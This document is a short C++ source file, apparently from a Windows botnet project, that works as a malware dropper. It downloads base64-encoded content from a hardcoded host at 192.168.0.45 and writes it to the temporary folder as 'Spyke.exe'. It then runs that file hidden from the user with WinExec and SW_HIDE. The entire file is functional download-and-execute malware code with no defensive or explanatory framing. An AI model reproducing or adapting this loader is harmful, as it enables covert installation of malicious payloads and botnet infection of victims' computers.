// BotnetWin32.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "Dropper.h"
#include "Utils.h"
#include "Connection.h"
#include "base64.h"

string ip = "192.168.0.45";
//string ip = "192.168.0.10";
TCHAR buf[255] = { 0 };
Utils utils;
base64 base;
Connection conn(ip);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	// getting based contents of an executable

	conn.HTTPGet();

	// writing an executable to the temporary folder

	TCHAR path[MAX_PATH + 1];
	DWORD len = MAX_PATH + 1;
	GetTempPath(len, path);
	TCHAR* full_path = _tcscat(path, L"Spyke.exe");
	wstring ws(full_path);
	string Path = string(ws.begin(), ws.end());
	ofstream ffo(full_path, ios::binary);
	ffo << base.base64_decode(conn.GetBuffer());
	ffo.close();

	// starting it

	WinExec(Path.c_str(), SW_HIDE);

	return 0;
}

